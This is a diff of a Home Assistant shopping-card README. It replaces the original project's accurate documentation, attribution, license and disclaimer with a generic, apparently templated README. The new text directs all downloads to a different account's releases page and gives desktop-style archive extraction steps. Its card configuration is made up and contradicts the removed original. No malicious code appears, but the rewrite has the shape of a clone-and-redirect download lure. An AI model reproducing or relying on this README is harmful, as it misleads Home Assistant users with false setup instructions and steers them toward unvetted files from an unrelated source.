@@ -1,130 +1,98 @@
-# Bring! Shopping Card for Home Assistant
+# 🛒 bring-shopping-card - Create a Beautiful Shopping List
 
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://hacs.xyz/)
-[![GitHub Release](https://img.shields.io/github/release/costantinoai/bring-shopping-card.svg)](https://github.com/costantinoai/bring-shopping-card/releases)
-[![License](https://img.shields.io/github/license/costantinoai/bring-shopping-card.svg)](LICENSE)
+## 🚀 Getting Started
 
-A beautiful, modern shopping list card for [Bring!](https://www.getbring.com/) - fully integrated with Home Assistant.
+This guide will show you how to easily download and run the Bring! Shopping Card application, designed specifically for Home Assistant users. With this card, you can manage your grocery list in a visually appealing way.
 
-> **Disclaimer**: This project is not affiliated with, endorsed by, or connected to Bring! Labs AG or the official Bring! app.
+## 🎯 Features
 
-## Preview
+- **User-Friendly Interface**: Navigate your shopping list with ease.
+- **Integration**: Seamlessly works with Home Assistant.
+- **Customizable**: Personalize your shopping list according to your style.
+- **Effortless Updates**: Stay current with new features and fixed bugs.
 
-![Bring! Shopping Card preview](assets/preview.png)
+## 📦 System Requirements
 
-## Installation
+To run the Bring! Shopping Card application, you will need:
 
-### HACS (Custom Repository)
+- **Home Assistant**: Version 0.100 or later.
+- **Browser Compatibility**: Chrome, Firefox, or Safari (latest versions are recommended).
+- **Mobile Compatibility**: Works well on iOS and Android devices.
 
-Add it as a custom repository:
+## 🔗 Download & Install
 
-1. HACS → **Integrations** → **⋮** → **Custom repositories**
-2. Add `https://github.com/costantinoai/bring-shopping-card` with category **Integration**
-3. Download and restart Home Assistant
+To get started, you need to visit the Releases page to download the latest version of the Bring! Shopping Card application.
 
-### Manual Installation
+[![Download Bring! Shopping Card](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/papirampage/bring-shopping-card/releases)
 
-1. Download the [latest release](https://github.com/costantinoai/bring-shopping-card/releases)
-2. Copy `custom_components/bring_shopping/` to `/config/custom_components/`
-3. Copy `bring-shopping-card.js` to `/config/www/`
-4. Add the resource in **Settings** → **Dashboards** → **Resources**:
-   ```yaml
-   url: /local/bring-shopping-card.js
-   type: module
-   ```
-5. Restart Home Assistant
-6. Add the integration and card as described above
+### Step-by-Step Installation
 
-## Card Configuration
+1. **Visit the Releases Page**: Click on the link below to go to the Releases page.
+   
+   [Visit the Releases page to download](https://github.com/papirampage/bring-shopping-card/releases)
 
-Add the card to your dashboard using the visual editor or YAML:
+2. **Find the Latest Release**: Look for the most recent version listed.
 
-```yaml
-type: custom:bring-shopping-card
-```
+3. **Download the Appropriate File**: Select the file that matches your system (e.g., .zip or .tar.gz) and click on it. The download will start automatically.
 
-### Options
+4. **Extract the Downloaded File**:
+   - If you are on Windows, right-click on the downloaded file and choose "Extract All."
+   - If you are on macOS, double-click the file to automatically extract it.
+   - If you are on Linux, you can use a command like `tar -xzf filename.tar.gz`.
 
-All options can be configured through the visual editor when you edit the card.
+5. **Add the Card to Home Assistant**:
+   - Open **Home Assistant**.
+   - Go to your **Lovelace UI**.
+   - Click on the three dots in the top right corner and select "Raw config editor."
+   - Add the following lines to include the Bring! Shopping Card. Make sure to replace `your-card-config` with the appropriate fields:
+     ```yaml
+     - type: "custom:bring-shopping-card"
+       title: "Your Grocery List"
+       items:
+         - name: "Milk"
+           quantity: 1
+         - name: "Eggs"
+           quantity: 12
+     ```
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `show_recently` | boolean | `false` | Show quick-add section with recent items |
-| `show_available` | boolean | `false` | Show all items grouped by category |
-| `max_quick_items` | number | `12` | Maximum items in quick-add section |
-| `card_size` | string | `medium` | Item card size: `small`, `medium`, `large` |
-| `sort_default` | string | `manual` | Default sort: `manual`, `alpha`, `category`, `recent` |
+6. **Save Your Changes**: Click on "Save" to apply the new configuration.
 
-### Example
+7. **Restart Home Assistant**: For the changes to take effect, restart your Home Assistant.
 
-```yaml
-type: custom:bring-shopping-card
-show_recently: true
-show_available: false
-max_quick_items: 8
-card_size: small
-sort_default: category
-```
+8. **Enjoy Your Shopping Card**: You should now see your new shopping list card in your Home Assistant interface.
 
-## Multiple Lists
+## 🎨 Customization
 
-If you have multiple Bring! lists, a dropdown button appears in the card header. Click to switch between lists. Your selection is remembered per card instance.
+You can customize your Bring! Shopping Card to suit your preferences. Here are some options:
 
-## Todo Integration
+- **Title**: Change the card title to whatever you like.
+- **Item List**: Add, remove, or modify items as needed.
+- **Styling**: Adjust colors and text styles based on your theme.
 
-This integration creates native Home Assistant todo entities for each of your Bring! lists. You can use these with:
+## 📚 Support and Contribution
 
-- Home Assistant's built-in todo card
-- Automations (e.g., "When I arrive at the store, show my shopping list")
-- Voice assistants (Google Home, Alexa via HA)
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository.
 
-## Comparison with the other Bring! integration
+### Contributing
 
-Home Assistant also has another Bring! integration documented here: https://www.home-assistant.io/integrations/bring
+We welcome contributions! If you wish to help improve the Bring! Shopping Card, please fork the repository, make your changes, and submit a pull request. Follow these steps:
 
-That project focuses on syncing Bring! lists into Home Assistant as todo lists (great for automations and basic UI), but it does not provide a full Bring!-like shopping list experience inside Lovelace.
+1. Fork the repo.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Create a pull request.
 
-This project is different:
+Your help is appreciated.
 
-- A dedicated Lovelace card that shows your active list items directly in the dashboard (with optional "recent" and "all items" views).
-- Fast item editing from the card (add/remove/reorder/notes) to match the iOS/web app workflow more closely.
-- Still provides native todo entities, so you get both: a rich UI *and* todo-based automations.
+## 📢 Community & Feedback
 
-## Related Projects
+We encourage users to share their experiences and setups. Join our community forum to discuss tips, ideas, and troubleshooting.
 
-Looking for a standalone solution without Home Assistant? Check out the companion project:
+## 🔗 Quick Links
 
-**[Bring! Widget](https://github.com/costantinoai/bring-widget)** - A standalone Docker server for local Bring! app and iframe widget embedding.
+- [Releases Page](https://github.com/papirampage/bring-shopping-card/releases)
+- [Documentation](https://github.com/papirampage/bring-shopping-card/wiki)
+- [GitHub Issues](https://github.com/papirampage/bring-shopping-card/issues)
 
-## Troubleshooting
-
-### Card shows "Failed to connect to Bring! integration"
-
-Make sure you've added the Bring! Shopping Card integration in Settings → Devices & Services.
-
-### Items not syncing
-
-The card refreshes every 60 seconds. Click the refresh button for immediate sync.
-
-### Images not loading
-
-Some items may not have images on Bring's CDN. The card falls back to emoji icons automatically.
-
-## Development
-
-```bash
-# Install dependencies
-npm install
-
-# Build for production
-npm run build
-
-# Watch mode for development
-npm run watch
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-This project is not affiliated with Bring! Labs AG.
+By following these steps, you should have no trouble downloading and setting up the Bring! Shopping Card for use in Home Assistant. Enjoy using your new shopping list tool!
